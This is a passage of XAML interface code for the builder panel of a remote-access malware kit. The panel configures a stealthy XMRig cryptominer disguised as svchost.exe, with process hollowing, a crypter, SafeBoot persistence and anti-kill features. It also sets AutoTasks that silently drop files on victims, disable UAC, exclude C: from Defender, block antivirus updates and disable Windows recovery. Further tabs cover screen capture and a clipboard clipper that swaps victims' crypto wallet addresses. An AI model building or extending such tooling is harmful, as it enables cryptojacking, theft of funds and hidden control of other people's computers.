                                                <Grid.ColumnDefinitions>
                                                    <ColumnDefinition Width="*"/>
                                                    <ColumnDefinition Width="8"/>
                                                    <ColumnDefinition Width="*"/>
                                                </Grid.ColumnDefinitions>
                                                <StackPanel>
                                                    <TextBlock Text="CHAT ID 1" Style="{StaticResource SFieldLabel}"/>
                                                    <TextBox x:Name="BldTelegramChatId1" Style="{StaticResource STxt}"
                                                             ToolTip="Your Telegram numeric user/chat ID"/>
                                                </StackPanel>
                                                <StackPanel Grid.Column="2">
                                                    <TextBlock Text="CHAT ID 2 (opt.)" Style="{StaticResource SFieldLabel}"/>
                                                    <TextBox x:Name="BldTelegramChatId2" Style="{StaticResource STxt}"
                                                             ToolTip="Second recipient (optional — leave blank to skip)"/>
                                                </StackPanel>
                                            </Grid>
                                            <StackPanel Orientation="Horizontal" Margin="0,6,0,0">
                                                <Button x:Name="BtnTelegramTest" Content="TEST"
                                                        Width="70" Height="30"
                                                        Style="{StaticResource SBtn}"
                                                        Click="BtnTelegramTest_Click"
                                                        FontSize="10" FontWeight="SemiBold"/>
                                                <TextBlock x:Name="TxtTelegramTestResult" Text=""
                                                           FontSize="10" FontFamily="Consolas"
                                                           VerticalAlignment="Center" Margin="10,0,0,0"/>
                                            </StackPanel>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>

                                <!-- RECONNECT + BUILD card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="RECONNECT" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <StackPanel Orientation="Horizontal" Margin="0,0,0,16">
                                            <TextBlock Text="Delay (ms):" Foreground="#606880" FontSize="12" VerticalAlignment="Center" Margin="0,0,8,0" />
                                            <TextBox x:Name="BldReconnectDelay" Style="{StaticResource STxt}" Width="70" Text="5000" />
                                        </StackPanel>
                                        <StackPanel Orientation="Horizontal">
                                            <Button x:Name="BtnBuild" Content="BUILD" Width="120" Height="30"
                                                    Style="{StaticResource SGreenBtn}" Click="Build_Click" />
                                            <Button Content="SAVE"      Width="70" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
                                            <Button Content="CHECK ALL" Width="96" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
                                        </StackPanel>
                                        <TextBlock x:Name="TxtBuildStatus" Text="" Foreground="#606880"
                                                   FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,12,0,0" />
                                    </StackPanel>
                                </Border>

                                    </StackPanel>
                            </Grid>
                            </ScrollViewer>

                            <!-- ── XMR page ── -->
                            <ScrollViewer x:Name="PageXmr" Grid.Row="1" Visibility="Collapsed"
                                          VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                            <Grid>
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="8"/>
                                    <ColumnDefinition Width="*"/>
                                </Grid.ColumnDefinitions>
                                <StackPanel Grid.Column="0" VerticalAlignment="Top">

                                <!-- Binary status -->
                                <Border Margin="0,0,0,12" Padding="8,6" CornerRadius="6"
                                        Background="#0CF59E0B" BorderThickness="1.5" BorderBrush="#50F59E0B">
                                    <StackPanel>
                                        <DockPanel Margin="0,0,0,3">
                                            <Button DockPanel.Dock="Right" Content="↗ Download" Height="18"
                                                    FontSize="9" FontWeight="SemiBold" FontFamily="Segoe UI"
                                                    Padding="6,0" Cursor="Hand"
                                                    Background="#1AF59E0B" BorderBrush="#40F59E0B" BorderThickness="1"
                                                    Foreground="#C8F59E0B"
                                                    ToolTip="Open XMRig latest release on GitHub"
                                                    Click="BldMnrDownloadXmrig_Click">
                                                <Button.Template>
                                                    <ControlTemplate TargetType="Button">
                                                        <Border x:Name="bd" Background="{TemplateBinding Background}"
                                                                BorderBrush="{TemplateBinding BorderBrush}"
                                                                BorderThickness="{TemplateBinding BorderThickness}"
                                                                CornerRadius="3" Padding="{TemplateBinding Padding}">
                                                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                                        </Border>
                                                        <ControlTemplate.Triggers>
                                                            <Trigger Property="IsMouseOver" Value="True">
                                                                <Setter TargetName="bd" Property="Background" Value="#30F59E0B"/>
                                                            </Trigger>
                                                        </ControlTemplate.Triggers>
                                                    </ControlTemplate>
                                                </Button.Template>
                                            </Button>
                                            <TextBlock Text="XMRIG BINARY" Foreground="#99F59E0B"
                                                       FontSize="9" FontWeight="Bold" FontFamily="Consolas"
                                                       VerticalAlignment="Center"/>
                                        </DockPanel>
                                        <TextBlock x:Name="BldMnrXmrigPath" Text="Searching…"
                                                   Foreground="#7880A8" FontSize="11" TextTrimming="CharacterEllipsis"/>
                                    </StackPanel>
                                </Border>

                                <!-- NETWORK card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="NETWORK" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="POOL URL" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrPool" Style="{StaticResource STxt}"
                                                 Text="pool.supportxmr.com:3333" Margin="0,0,0,4"/>
                                        <CheckBox x:Name="BldMnrTls" Content="TLS / SSL" Foreground="#FFCCCCCC"
                                                  FontFamily="Consolas" FontSize="11" Margin="0,0,0,6"/>
                                        <TextBlock Text="WALLET ADDRESS" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrWallet" Style="{StaticResource STxt}"
                                                 Text="" Margin="0,0,0,6" ToolTip="Your Monero wallet address"/>
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="8"/>
                                                <ColumnDefinition Width="88"/>
                                            </Grid.ColumnDefinitions>
                                            <StackPanel>
                                                <TextBlock Text="PASSWORD" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrPass" Style="{StaticResource STxt}" Text="x"/>
                                            </StackPanel>
                                            <StackPanel Grid.Column="2">
                                                <TextBlock Text="ALGO" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrAlgo" Style="{StaticResource STxt}" Text="rx/0"/>
                                            </StackPanel>
                                        </Grid>
                                        <TextBlock Text="WORKER NAME (optional)" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Worker label shown in pool stats. Leave blank to use Password field."/>
                                        <TextBox x:Name="BldMnrWorkerName" Style="{StaticResource STxt}" Text=""
                                                 ToolTip="e.g. rig1 — overrides Password field as the pool worker name"/>
                                    </StackPanel>
                                </Border>

                                <!-- CPU TUNING card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="CPU TUNING" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <Grid Margin="0,0,0,6">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="8"/>
                                                <ColumnDefinition Width="*"/>
                                            </Grid.ColumnDefinitions>
                                            <StackPanel>
                                                <TextBlock Text="CPU% IDLE" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrCpuIdle" Style="{StaticResource STxt}" Text="75"
                                                         ToolTip="CPU % when user is idle"/>
                                            </StackPanel>
                                            <StackPanel Grid.Column="2">
                                                <TextBlock Text="CPU% ACTIVE" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrCpuActive" Style="{StaticResource STxt}" Text="0"
                                                         ToolTip="0 = no cap when user is active"/>
                                            </StackPanel>
                                        </Grid>
                                        <StackPanel>
                                            <TextBlock Text="IDLE AFTER (sec)" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldMnrIdleSec" Style="{StaticResource STxt}" Text="30"/>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>
                                    </StackPanel>
                                    <StackPanel Grid.Column="2" VerticalAlignment="Top">

                                <!-- DEPLOY card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="DEPLOY" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="INSTALL NAME" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrInstallName" Style="{StaticResource STxt}"
                                                 Text="svchost.exe" Margin="0,0,0,6"
                                                 ToolTip="Filename used when xmrig is written to AppData"/>
                                        <CheckBox x:Name="BldMnrStealth" Content="Stealth process (taskmgr, procexp, sysinformer, process hacker)"
                                                  Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Pause/kill miner when a process monitor is detected"/>
                                        <!-- Centralized stats server URL -->
                                        <TextBlock Text="STATS SERVER URL" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Click Launch to start stats-server — URL is auto-filled. Or paste manually: http://your-ip:8080/api/report"/>
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="4"/>
                                                <ColumnDefinition Width="Auto"/>
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldMnrStatsUrl" Grid.Column="0" Style="{StaticResource STxt}" Text=""
                                                     ToolTip="Auto-filled when you click Launch, or paste: http://your-ip:8080/api/report"/>
                                            <Button Grid.Column="2" Content="Launch" Padding="8,3"
                                                    ToolTip="Start stats-server (if not running), fill URL, open browser"
                                                    Click="BldMnrStatsLaunch_Click"
                                                    Style="{StaticResource SBtn}"/>
                                        </Grid>
                                        <TextBlock Text="STATS TOKEN" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Secret key — only miners with this token can post stats. Required when server is public."/>
                                        <TextBox x:Name="BldMnrStatsToken" Style="{StaticResource STxt}" Text=""
                                                 ToolTip="Token set in start_stats.bat (default: sero123). Must match the server token."/>
                                        <TextBlock Margin="0,4,0,0" FontSize="10" Foreground="#60A0FF" FontFamily="Consolas"
                                                   TextWrapping="Wrap"
                                                   Text="Run stats-server.exe → paste URL above → Open. All miners appear in one page."/>
                                    </StackPanel>
                                </Border>

                                <!-- PROTECTION card -->
                                <Border Margin="0,0,0,14" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldMnrDisableSleep" Content="Disable sleep (keep system awake)"
                                                  Style="{StaticResource SChk}" IsChecked="True"/>
                                        <CheckBox x:Name="BldMnrStartup" Content="Persist via scheduled task"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                        <CheckBox x:Name="BldMnrSafeBoot" Content="SafeBoot persistence (service + registry)"
                                                  Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Installs stub as auto-start service and registers in SafeBoot registry keys — survives Safe Mode reboots"/>
                                        <CheckBox x:Name="BldMnrWatchdog" Content="Anti-Kill + Watchdog (DACL + auto-restart)"
                                                  Style="{StaticResource SChk}" IsChecked="True"/>
                                        <CheckBox x:Name="BldMnrBotKiller" Content="BotKiller (kill competing miners)"
                                                  Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Scans every 30s and kills known CPU/GPU miners. Clears critical-process flag before killing to avoid BSOD."/>
                                        <CheckBox x:Name="BldMnrHollow" Content="Process Hollowing"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                        <StackPanel Margin="0,2,0,6"
                                                    Visibility="{Binding IsChecked, ElementName=BldMnrHollow, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="HOLLOW TARGET" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldMnrHollowTarget" Style="{StaticResource STxt}" Text="svchost.exe"/>
                                        </StackPanel>
                                        <CheckBox x:Name="BldMnrEncrypt" Content="Crypter (AES-256, loader, polymorphic)"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                        <CheckBox x:Name="BldMnrUpx" Content="UPX compression (upx.exe in PATH or tools/)"
                                                  Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces size ~70%."/>
                                    </StackPanel>
                                </Border>

                                <!-- BUILD card -->
                                <Border Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="BUILD" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <StackPanel Orientation="Horizontal">
                                            <Button x:Name="BtnMnrBuild" Content="BUILD" Width="120" Height="30"
                                                    Style="{StaticResource SGreenBtn}" Click="BldMnrBuild_Click"/>
                                            <Button Content="WEB PANEL" Width="100" Height="30" Margin="8,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrStatsLaunch_Click"
                                                    ToolTip="Start stats-server (if not running) and open the web dashboard in the browser"/>
                                            <Button Content="SAVE CONFIG" Width="100" Height="30" Margin="8,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrSaveConfig_Click"/>
                                            <Button Content="LOAD CONFIG" Width="100" Height="30" Margin="6,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrLoadConfig_Click"/>
                                        </StackPanel>
                                        <TextBlock x:Name="TxtMnrBuildStatus" Text="" Foreground="#606880"
                                                   FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,8,0,0"/>
                                    </StackPanel>
                                </Border>

                                    </StackPanel>
                            </Grid>
                            </ScrollViewer>

                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── AutoTask ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="▷" Foreground="#F59E0B" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="AutoTask"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="20" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto" />
                                <RowDefinition Height="*" />
                            </Grid.RowDefinitions>

                            <StackPanel Margin="0,0,0,14">
                                <TextBlock Foreground="#505870" FontSize="11" FontFamily="Segoe UI"
                                           HorizontalAlignment="Center" Margin="0,0,0,8" TextWrapping="Wrap" TextAlignment="Center">
                                    <Run FontWeight="SemiBold" Foreground="#8090B8">AutoTasks</Run>
                                    <Run> are actions automatically executed on newly connected clients. Each task runs exactly </Run>
                                    <Run FontWeight="SemiBold" Foreground="#8090B8">once per HWID</Run>
                                    <Run> so re-connecting clients are not affected again.</Run>
                                </TextBlock>
                                <WrapPanel HorizontalAlignment="Center" Margin="0,0,0,8">
                                    <Button Content="ADD FILE"     Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_AddFile_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Add File</Run>&#x0a;Upload an executable or script that will be dropped and run silently on every new client. The file is stored in the server and sent once per HWID.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="EXCLUDE C:"   Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_ExcludeCDrive_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Exclude C:\</Run>&#x0a;Adds C:\ to Windows Defender's exclusion list via WMI (requires SYSTEM/Admin). Prevents Defender from scanning or quarantining files on the C drive.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="DISABLE UAC"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_DisableUAC_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Disable UAC</Run>&#x0a;Sets EnableLUA=0 and disables all UAC consent prompts via registry. Requires Admin. Takes effect after next reboot — future processes run elevated without any popup.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="BLOCK AV DNS" Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockAvDomains_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Block AV DNS</Run>&#x0a;Blocks update/telemetry domains of common antivirus products (Windows Defender, Kaspersky, ESET, Bitdefender, etc.) via the hosts file. Prevents AV signature updates and cloud lookups.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="BLOCK RESET"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockReset_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Block Reset</Run>&#x0a;Disables Windows Recovery Environment (WinRE) via reagentc /disable. Prevents the user from booting into recovery mode or resetting the PC to factory defaults.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="BOTKILLER"    Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BotKiller_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">BotKiller</Run>&#x0a;Scans for and terminates unsigned processes with random-looking names (common RAT/miner pattern). Also removes their persistence from Run registry keys and the Startup folder.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="CUSTOM"       Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_Custom_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Custom Command</Run>&#x0a;Enter a custom PowerShell or CMD command that will be silently executed on every new client once per HWID.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                    <Button Content="REMOVE"       Height="30" Margin="4" Style="{StaticResource SBtn}"      Click="AutoTask_Remove_Click">
                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Remove</Run>&#x0a;Removes the selected task(s) from the AutoTask list. Already-executed instances on clients are not reversed.</TextBlock></ToolTip></Button.ToolTip>
                                    </Button>
                                </WrapPanel>
                                <TextBlock Text="Tasks execute once per HWID"
                                           Foreground="#606880" FontSize="11"
                                           HorizontalAlignment="Center" />
                            </StackPanel>

                            <DataGrid x:Name="GridAutoTasks" Grid.Row="1"
                                      AutoGenerateColumns="False" IsReadOnly="True"
                                      Background="Transparent" Foreground="#DDE0F0"
                                      BorderThickness="0" RowBackground="Transparent"
                                      AlternatingRowBackground="#07101428"
                                      GridLinesVisibility="None" HeadersVisibility="Column"
                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
                                      ColumnHeaderStyle="{StaticResource SColHeader}">
                                <DataGrid.Columns>
                                    <DataGridTextColumn Header="NAME"       Binding="{Binding FileName}"                                Width="*"   />
                                    <DataGridTextColumn Header="TYPE"       Binding="{Binding TypeDisplay}"                             Width="110" />
                                    <DataGridTextColumn Header="SIZE"       Binding="{Binding SizeDisplay}"                             Width="90"  />
                                    <DataGridTextColumn Header="EXECUTIONS" Binding="{Binding ExecutionCount}"                          Width="100" />
                                    <DataGridTextColumn Header="ADDED"      Binding="{Binding AddedAt, StringFormat=yyyy-MM-dd HH:mm}" Width="140" />
                                </DataGrid.Columns>
                                <DataGrid.ContextMenu>
                                    <ContextMenu>
                                        <MenuItem Header="Remove" Click="AutoTask_Remove_Click">
                                            <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
                                        </MenuItem>
                                        <Separator />
                                        <MenuItem Header="Refresh" Click="AutoTask_Refresh_Click">
                                            <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon>
                                        </MenuItem>
                                    </ContextMenu>
                                </DataGrid.ContextMenu>
                            </DataGrid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── Screen ── -->
                <TabItem x:Name="ScreenTabItem">
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="🖥" FontSize="12" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Screen"/>
                        </StackPanel>
                    </TabItem.Header>
                    <DockPanel>
                        <!-- Toolbar -->
                        <Border DockPanel.Dock="Top" Background="#111222" Padding="12,8"
                                BorderBrush="#1A1C2E" BorderThickness="0,0,0,1">
                            <Grid>
                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" VerticalAlignment="Center">
                                    <Button x:Name="BtnScreenStart" Content="START"
                                            Click="ScreenStart_Click" Style="{StaticResource SGreenBtn}"
                                            Height="30" Padding="14,0"/>
                                    <Button x:Name="BtnScreenStop" Content="STOP"
                                            Click="ScreenStop_Click" Style="{StaticResource SRedBtn}"
                                            Height="30" Padding="14,0" Margin="6,0,0,0"
                                            IsEnabled="False" Opacity="0.4"/>
                                </StackPanel>
                            </Grid>
                        </Border>
                        <!-- Tiles -->
                        <ScrollViewer x:Name="ScreenScroll"
                                      VerticalScrollBarVisibility="Auto"
                                      HorizontalScrollBarVisibility="Disabled"
                                      SizeChanged="ScreenScroll_SizeChanged"
                                      Loaded="ScreenScroll_Loaded">
                            <UniformGrid x:Name="ScreenPanel" Columns="4" Margin="72,36,72,36" VerticalAlignment="Top"/>
                        </ScrollViewer>
                    </DockPanel>
                </TabItem>

                <!-- ── Crypto Clipper ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <Image Source="/Resources/crypto/btc.png" Width="14" Height="14"
                                   Margin="0,0,5,0" VerticalAlignment="Center"
                                   RenderOptions.BitmapScalingMode="HighQuality"/>
                            <TextBlock Text="Clipper"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8" Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <!-- Subtle ₿ watermark -->
                            <TextBlock Text="₿" FontSize="320" FontWeight="Bold" Opacity="0.018"
                                       HorizontalAlignment="Center" VerticalAlignment="Center"
                                       Foreground="#F7931A" IsHitTestVisible="False"
                                       FontFamily="Segoe UI" Margin="0,40,0,0"/>

                            <ScrollViewer VerticalScrollBarVisibility="Auto"
                                          HorizontalScrollBarVisibility="Disabled">
                            <DockPanel Margin="14,12,14,12" LastChildFill="True"
                                       MinHeight="460">

                                <!-- Header bar with market-ticker style -->
                                <Border DockPanel.Dock="Top" Margin="0,0,0,10" Padding="14,10" CornerRadius="6"
                                        BorderThickness="1">
                                    <Border.Background>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="#0D0E1A" Offset="0"/>
                                            <GradientStop Color="#0A0C14" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.Background>
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="#2A2010" Offset="0"/>
                                            <GradientStop Color="#1A1828" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                    <Grid>
                                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                            <!-- Bitcoin logo -->
                                            <Image Source="/Resources/crypto/btc.png" Width="28" Height="28"
                                                   Margin="0,0,10,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                            <StackPanel VerticalAlignment="Center">
                                                <TextBlock Text="CRYPTO CLIPPER" FontSize="10" FontWeight="Bold"
                                                           FontFamily="Consolas" Foreground="#C8A060"/>
                                                <TextBlock Text="clipboard address interceptor" FontSize="9"
                                                           Foreground="#404060" FontFamily="Consolas"/>
                                            </StackPanel>
                                            <Border x:Name="ClipperActiveBadge" Margin="12,0,0,0" CornerRadius="3"
                                                    Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
                                                    Padding="8,3" Visibility="Collapsed" VerticalAlignment="Center">
                                                <StackPanel Orientation="Horizontal">
                                                    <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                                        <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="6" ShadowDepth="0" Opacity="1"/></Ellipse.Effect>
                                                    </Ellipse>
                                                    <TextBlock Text="INTERCEPTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Consolas"/>
                                                </StackPanel>
                                            </Border>
                                            <TextBlock x:Name="ClipperCountTxt" Text=""
                                                       Foreground="#404868" FontSize="11" FontFamily="Consolas"
                                                       VerticalAlignment="Center" Margin="14,0,0,0"/>
                                        </StackPanel>
                                        <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" VerticalAlignment="Center">
                                            <Button x:Name="BtnClipperStart" Content="START" Height="30" Padding="14,0"
                                                    Margin="0,0,6,0" Style="{StaticResource SGreenBtn}"
                                                    Click="ClipperStart_Click"
                                                    ToolTip="Enable clipper and push to all connected clients"/>
                                            <Button x:Name="BtnClipperStop" Content="STOP" Width="68" Height="30"
                                                    Style="{StaticResource SRedBtn}" IsEnabled="False" Opacity="0.4"
                                                    Margin="0,0,6,0" Click="ClipperStop_Click"
                                                    ToolTip="Disable clipper on all connected clients"/>
                                            <Button Content="💾 Save" Height="30" Padding="12,0"
                                                    Style="{StaticResource SBtn}"
                                                    Click="ClipperSave_Click"
                                                    ToolTip="Save addresses to config"/>
                                        </StackPanel>
                                    </Grid>
                                </Border>

                                <!-- Detection log at bottom -->
                                <Border DockPanel.Dock="Bottom" Margin="0,10,0,0" CornerRadius="6"
                                        Background="#070810" BorderThickness="1" BorderBrush="#12142A">
                                    <DockPanel>
                                        <Grid DockPanel.Dock="Top" Margin="12,8,12,6">
                                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                <TextBlock Text="●" FontSize="7" Foreground="#22C55E" VerticalAlignment="Center" Margin="0,0,6,0"/>
                                                <TextBlock Text="INTERCEPT LOG" FontSize="9" FontWeight="Bold"
                                                           Foreground="#1A5E28" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <Button Content="Clear" Height="22" Padding="10,0" HorizontalAlignment="Right"
                                                    Style="{StaticResource SBtn}" FontSize="10" Click="ClipperClearLog_Click"/>
                                        </Grid>
                                        <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto"
                                                      Height="100" DockPanel.Dock="Top" Margin="0,0,0,8">
                                            <TextBox x:Name="ClipperLog"
                                                     Background="Transparent" Foreground="#4AE870"
                                                     FontFamily="Consolas" FontSize="11"
                                                     BorderThickness="0" Padding="12,4"
                                                     IsReadOnly="True" TextWrapping="Wrap"
                                                     AcceptsReturn="True"/>
                                        </ScrollViewer>
                                    </DockPanel>
                                </Border>

                                <!-- Address grid — single full-width column for maximum input space -->
                                <Border CornerRadius="6" Padding="16,14" BorderThickness="1" BorderBrush="#16182A"
                                        Background="#08090F">
                                    <StackPanel>
                                        <TextBlock Text="DESTINATION ADDRESSES" FontSize="9" FontWeight="Bold"
                                                   Foreground="#604820" FontFamily="Consolas" Margin="0,0,0,12"/>
                                        <!-- BTC -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/btc.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="BTC" Foreground="#F7931A" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperBTC" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Bitcoin — P2PKH/P2SH/Bech32"/></Grid>
                                        <!-- ETH -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/eth.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
